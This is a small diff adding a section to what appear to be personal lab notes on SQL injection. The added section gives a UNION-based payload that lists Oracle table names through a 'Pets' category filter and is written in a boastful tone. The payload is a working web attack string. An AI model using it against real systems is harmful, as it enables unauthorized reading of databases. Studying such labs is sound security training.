@@ -21,3 +21,8 @@ administrator
 ```
 
 Chaching 💸
+
+### SQL injection attack, listing the database contents on Oracle
+Same thing, just with Oracle. Ezpz. I'm a master at this.
+
+>Pets' union select table_name, null from all_tables--
